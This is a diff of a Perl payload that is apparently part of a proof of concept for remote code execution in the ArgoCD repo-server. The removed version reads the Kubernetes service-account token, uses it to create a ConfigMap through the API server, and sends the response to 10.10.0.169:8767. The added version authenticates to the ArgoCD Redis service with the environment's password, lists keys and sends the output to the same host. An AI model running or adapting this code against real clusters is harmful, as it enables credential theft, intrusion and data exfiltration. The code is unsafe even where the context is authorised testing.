@@ -1,20 +1,17 @@
 #!/usr/bin/perl
-use strict;
-use warnings;
-use IO::Socket::INET;
-my $name = 'brightbot-argocd-rce-proof-1783096417';
-my $token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token';
-open(my $tfh, '<', $token_path) or die "token open failed: $!";
-my $token = <$tfh>; chomp $token; close($tfh);
-my $body = '{"apiVersion":"v1","kind":"ConfigMap","metadata":{"name":"'.$name.'","namespace":"argocd","labels":{"brightbot-proof":"argocd-reposerver-rce"}},"data":{"proof":"created-by-benign-argocd-reposerver-rce-poc"}}';
-my $len = length($body);
-my $req = "POST /api/v1/namespaces/argocd/configmaps HTTP/1.1\r\nHost: kubernetes.default.svc\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$body";
-open(my $ssl, '|-', 'openssl s_client -quiet -connect kubernetes.default.svc:443 -servername kubernetes.default.svc -CAfile /var/run/secrets/kubernetes.io/serviceaccount/ca.crt >/tmp/brightbot-k8s-response 2>&1') or die "openssl failed: $!";
-print $ssl $req;
-close($ssl);
-my $resp = '';
-if (open(my $rfh, '<', '/tmp/brightbot-k8s-response')) { local $/; $resp = <$rfh>; close($rfh); }
-$resp =~ s/\r/ /g; $resp =~ s/\n/ /g; $resp = substr($resp, 0, 600);
-my $sock = IO::Socket::INET->new(PeerAddr => '10.10.0.169', PeerPort => 8767, Proto => 'tcp', Timeout => 3);
-if ($sock) { print $sock "created_attempt name=$name response=$resp\n"; close($sock); }
+use strict; use warnings; use IO::Socket::INET;
+sub redis_cmd { my @parts=@_; my $s='*'.scalar(@parts)."\r\n"; for my $p (@parts) { $s .= '$'.length($p)."\r\n$p\r\n"; } return $s; }
+my $out='';
+my $r = IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local', PeerPort=>6379, Proto=>'tcp', Timeout=>3);
+if ($r) {
+  my $pw = $ENV{REDIS_PASSWORD} || '';
+  print $r redis_cmd('AUTH',$pw) if $pw ne '';
+  print $r redis_cmd('KEYS','*directory-demo*');
+  $r->shutdown(1);
+  local $/; eval { $out = <$r> // ''; };
+  close($r);
+} else { $out="redis_connect_failed:$!"; }
+$out =~ s/\r/ /g; $out =~ s/\n/ /g; $out = substr($out,0,1500);
+my $sock = IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8767,Proto=>'tcp',Timeout=>3);
+if ($sock) { print $sock "redis_keys $out\n"; close($sock); }
 exit 1;
